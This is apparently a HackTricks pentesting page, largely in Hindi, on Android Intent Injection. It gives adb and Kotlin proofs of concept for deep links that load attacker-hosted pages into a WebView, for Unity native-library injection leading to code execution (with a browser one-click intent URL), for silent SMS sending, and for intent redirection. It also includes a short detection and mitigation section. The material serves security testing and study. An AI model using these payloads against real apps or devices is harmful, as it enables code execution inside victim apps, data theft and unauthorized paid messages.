# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent Injection उन components का दुरुपयोग करता है जो attacker-controlled Intents स्वीकार करते हैं या ऐसे डेटा जिन्हें बाद में Intents में परिवर्तित किया जाता है। Android app pentests के दौरान दो बहुत सामान्य पैटर्न हैं:

- Crafted extras को exported Activities/Services/BroadcastReceivers में पास करना जो बाद में privileged, non-exported components को फॉरवर्ड किए जाते हैं।
- Exported VIEW/BROWSABLE deep links को ट्रिगर करना जो attacker-controlled URLs को internal WebViews या अन्य संवेदनशील sinks में फॉरवर्ड करते हैं।

## Deep links → WebView sink (URL parameter injection)

यदि कोई app एक custom scheme deep link एक्सपोज़ करता है जैसे:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
और receiving Activity `url` query parameter को WebView में आगे भेजता है, तो आप ऐप को अपने ही WebView context में मनमाना दूरस्थ कंटेंट प्रदर्शित करने के लिए मजबूर कर सकते हैं।

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
प्रभाव
- HTML/JS ऐप के WebView प्रोफ़ाइल के अंदर चलता है।
- यदि JavaScript सक्षम है (डिफ़ॉल्ट रूप से या गलत क्रम में किए गए चेक्स के कारण), तो आप किसी भी एक्सपोज़ हुए `@JavascriptInterface` objects को enumerate/use कर सकते हैं, WebView cookies/local storage चुरा सकते हैं, और pivot कर सकते हैं।

इन्हें भी देखें:

{{#ref}}
webview-attacks.md
{{#endref}}

## जाँचों के क्रम की बग जो JavaScript को सक्षम कर देती है

एक बार-बार मिलने वाली बग यह है कि final URL allowlist/verification खत्म होने से पहले JavaScript (या अन्य permissive WebView सेटिंग्स) को सक्षम कर दिया जाता है। यदि शुरुआती helpers आपका deep link स्वीकार कर लेते हैं और पहले WebView को configure कर दिया जाता है, तो आपकी final load JavaScript पहले से ही enabled के साथ होती है भले ही बाद के checks flawed हों या बहुत देर से हों।

decompiled code में किन चीज़ों की तलाश करें:
- Multiple helpers जो URL को अलग तरीके से parse/split/rebuild करते हैं (inconsistent normalization)।
- अंतिम host/path allowlist check से पहले `getSettings().setJavaScriptEnabled(true)` को कॉल किया गया हो।
- एक पाइपलाइन जैसे: parse → partial validate → configure WebView → final verify → loadUrl।

## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-आधारित Android apps आमतौर पर एंट्री Activity के रूप में `com.unity3d.player.UnityPlayerActivity` (या `UnityPlayerGameActivity`) का उपयोग करते हैं। Unity के Android template में एक विशेष Intent extra जिसका नाम `unity` है, उसे Unity runtime के लिए command-line flags की स्ट्रिंग माना जाता है। जब entry Activity exported होती है (कई templates में default), तो कोई भी स्थानीय app — और कभी-कभी एक वेबसाइट भी अगर `BROWSABLE` मौजूद है — यह extra प्रदान कर सकती है।

एक खतरनाक, अप्रलेखित flag बहुत ही आरंभिक process initialization के दौरान native code execution का कारण बनता है:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` init में बहुत जल्दी चलता है, attacker-controlled ELF को target app के process के अंदर इसके UID और permissions के साथ लोड करता है।

Reverse-engineering अंश (सरलीकृत):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
क्यों यह काम करता है
- The Intent extra `unity` को Unity runtime flags में पार्स किया जाता है।
- `pre-init` flag प्रदान करने पर Unity को allowed linker namespace path के भीतर attacker-controlled ELF path की ओर इंगित किया जाता है (नीचे दिए गए प्रतिबंध देखें)।

शोषण के लिए शर्तें
- Unity entry Activity exported है (आम तौर पर डिफ़ॉल्ट रूप से true)।
- ब्राउज़र के माध्यम से one-click remote के लिए: entry Activity भी `android.intent.category.BROWSABLE` घोषित करता है ताकि extras को एक `intent:` URL से पास किया जा सके।

लोकल शोषण (एक ही डिवाइस)
1) payload ELF को उस path पर रखें जिसे victim app पढ़ सके। सबसे आसान तरीका: अपने attacker app में एक malicious library भेजें और सुनिश्चित करें कि यह attacker’s manifest में सेट करके `/data/app/.../lib/<abi>/` के अंतर्गत extract किया गया है:
```xml
<application android:extractNativeLibs="true" ...>
```
2) `unity` extra में CLI pre-init flag के साथ victim’s Unity activity लॉन्च करें। उदाहरण ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; आपका payload victim process में चलने लगता है, और वह उसके सभी app permissions (camera/mic/network/storage, आदि) और इन‑ऐप sessions/data तक पहुँच को विरासत में पाता है।

Notes
- The exact `/data/app/...` path varies across devices/installs. एक attacker app रनटाइम पर अपना native lib dir `getApplicationInfo().nativeLibraryDir` के माध्यम से प्राप्त कर सकता है और उसे trigger को भेज सकता है।
- फ़ाइल का नाम `.so` पर समाप्त होना आवश्यक नहीं है अगर वह valid ELF है — `dlopen()` ELF headers को देखता है, extensions को नहीं।

Remote one‑click via browser (conditional)
यदि Unity entry activity `BROWSABLE` के साथ exported है, तो एक वेबसाइट `intent:` URL के माध्यम से extras पास कर सकती है:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
हालाँकि, आधुनिक Android पर dynamic linker namespaces और SELinux कई सार्वजनिक पथों (जैसे, `/sdcard/Download`) से लोडिंग को रोकते हैं। आप इस तरह की त्रुटियाँ देखेंगे:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: target apps that cache attacker-controlled bytes under their private storage (e.g., HTTP caches). Because permitted paths include `/data` and the app’s private dir, pointing `-xrsdk-pre-init-library` at an absolute path inside the app’s cache can satisfy linker constraints and yield code execution. This mirrors prior cache-to-ELF RCE patterns experienced in other Android apps.

## Confused‑Deputy: मूक SMS/MMS ACTION_SENDTO के माध्यम से (Wear OS Google Messages)

कुछ डिफ़ॉल्ट messaging ऐप्स गलत तरीके से implicit messaging intents को auto‑execute कर देते हैं, जिससे वे एक confused‑deputy primitive बन जाते हैं: कोई भी unprivileged app `Intent.ACTION_SENDTO` को `sms:`, `smsto:`, `mms:`, या `mmsto:` के साथ ट्रिगर कर सकता है और बिना confirmation UI और बिना `SEND_SMS` permission के तुरंत संदेश भेज सकता है।

मुख्य बिंदु
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: सेट करें recipient को URI में, message text `"sms_body"` extra में रखें।
- Permissions: कोई नहीं (no `SEND_SMS`), यह default SMS/MMS handler पर निर्भर करता है।
- Observed: Google Messages for Wear OS (patched May 2025). अन्य handlers की भी इसी तरह से जांच की जानी चाहिए।

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (कोई विशेष अनुमति आवश्यक नहीं)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
हमले की सतह का विस्तार (Wear OS)
- कोई भी component जो Activities लॉन्च करने में सक्षम हो वही payload फायर कर सकता है: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- यदि default handler स्वचालित रूप से भेज देता है, तो दुरुपयोग एक‑टैप या बैकग्राउंड contexts से पूरी तरह silent हो सकता है, OEM नीतियों पर निर्भर करते हुए।

Pentest चेकलिस्ट
- लक्ष्य पर `ACTION_SENDTO` को resolve करें ताकि default handler की पहचान हो सके; सत्यापित करें कि क्या यह compose UI दिखाता है या चुपचाप भेज देता है।
- चारों schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) और extras (`sms_body`, optionally `subject` for MMS) का परीक्षण करें ताकि व्यवहार में अंतर की जाँच हो सके।
- real devices पर टेस्ट करते समय charged destinations/premium‑rate numbers पर विचार करें।

## अन्य क्लासिक Intent injection primitives

- startActivity/sendBroadcast का उपयोग करते हुए attacker-supplied `Intent` extras जिन्हें बाद में re-parsed (`Intent.parseUri(...)`) और execute किया जाता है।
- Exported proxy components जो Intents को बिना permission checks के non-exported sensitive components पर फॉरवर्ड करते हैं।

---

## Automating exported-component testing (Smali-driven ADB generation)

जब exported components specific extras की उम्मीद करते हैं, तो payload के आकार का अनुमान लगाना समय बर्बाद और false negatives का कारण बनता है। आप Smali से सीधे keys/types का ऑटो डिस्कवरी कर सकते हैं और ready-to-run adb commands जनरेट कर सकते हैं।

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: Smali को decompile और scan करके उन कॉल्स जैसे `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` की तलाश करें ताकि यह पता चले कि कौन से extras और फील्ड्स प्रत्येक component द्वारा consume किए जा रहे हैं।
- Output: हर exported Activity/Service/Receiver/Provider के लिए, टूल एक संक्षिप्त explanation और सही प्रकार के flags के साथ exact `adb shell am ...`/`cmd content ...` कमांड प्रिंट करता है।

इंस्टॉल
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
उपयोग
```bash
python apk-components-inspector.py target.apk
```
# Intent Injection

Intent Injection एक कमजोरी है जहाँ कोई अनधिकृत या maliciously crafted Intent भेजकर target एप्लिकेशन के व्यवहार को बदल सकता है। यह अक्सर तब होता है जब public या exported components (Activities, Services, Broadcast Receivers) बिना उपयुक्त validation या permission checks के उपलब्ध रहते हैं।

संभावित संकेत:
- External Intents आने पर एप्लिकेशन में unexpected behaviour।
- Crash reports या logs में अनजान data या unexpected extras।
- Exported components जिनके पास कोई restriction नहीं है।

Detection:
- एप्लिकेशन के Manifest में exported components की सूची देखें।
- Runtime पर incoming Intents के content और source की निगरानी करें।
- Crash और error logs को analyze करें ताकि suspicious payloads पकड़े जा सकें।

Mitigation:
- आने वाले Intents की validation करें: action, data, और extras की जाँच करें।
- आवश्यक हो तो custom permissions लागू करें और exported को false रखें जब component external access की आवश्यकता न हो।
- Explicit Intents का उपयोग करें जहाँ संभव हो और sensitive operations हेतु signature-level permissions या runtime checks लागू करें।
- Untrusted sources से आने वाले data को कभी भी blindly trust न करें; sanitize और verify करें।
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras चीट शीट (type-aware flags)
- Strings: `--es key value` | String array: `--esa key v1,v2`
- Integers: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Common flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- ContentProviders को बिना agents के हिट करने के लिए `adb shell cmd content query|insert|update|delete ...` का उपयोग करें।
- SQLi probing के लिए, underlying provider SQLite-backed होने पर `--projection` और `--where` (जिसे selection भी कहा जाता है) बदलें।

Full-pipeline automation (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>adb कमांड्स को पार्स और निष्पादित करने के लिए सहायक स्क्रिप्ट</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

डिवाइस पर चलाएँ: इंस्पेक्टर Python-आधारित है और Termux या rooted फ़ोनों पर काम करता है जहाँ `apktool`/`androguard` उपलब्ध हैं।

---

## Intent Redirection (CWE-926) – finding and exploiting

पैटर्न
- एक exported entry point (Activity/Service/Receiver) इनकमिंग Intent को पढ़ता है और source/data की वैधता की जाँच किए बिना इसे अंदरूनी या बाहरी रूप से फॉरवर्ड कर देता है, जैसे:
- `startActivity(getIntent())`
- `startActivity(intent)` जहाँ `intent` किसी extra से आया था जैसे `redirect_intent`/`next_intent`/`pending_intent` या `Intent.parseUri(...)`.
- बिना चेक के `action`/`data`/`component` फील्ड्स पर भरोसा करना; कॉलर की पहचान सत्यापित न करना।

Smali/Java में क्या खोजें
- `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)` के उपयोग।
- हमलावर-प्रभावित Intents पर सीधे `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` कॉल।
- `getCallingPackage()`/`getCallingActivity()` चेक्स या कस्टम permission gates का अभाव।

ADB PoC टेम्पलेट्स
- Proxy Activity जो एक extra Intent को privileged internal Activity को फॉरवर्ड करती है:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exported Service जो `redirect_intent` parcelable का सम्मान करता है:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver जो सत्यापन के बिना आगे प्रेषित करता है:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
singleTask-style व्यवहार के लिए सहायक Flags
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
वास्तविक दुनिया के उदाहरण (प्रभाव अलग-अलग हो सकते हैं):
- CVE-2024-26131 (Element Android): exported flows के परिणामस्वरूप WebView manipulation, PIN bypass, login hijack।
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → सिस्टम-स्तरीय प्रभाव।
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → arbitrary file access (उपयोगकर्ता इंटरैक्शन के साथ)।
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents content leak।
- CVE-2021-4438 (React Native SMS User Consent)।
- CVE-2020-14116 (Xiaomi Mi Browser)।

---

## संदर्भ

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
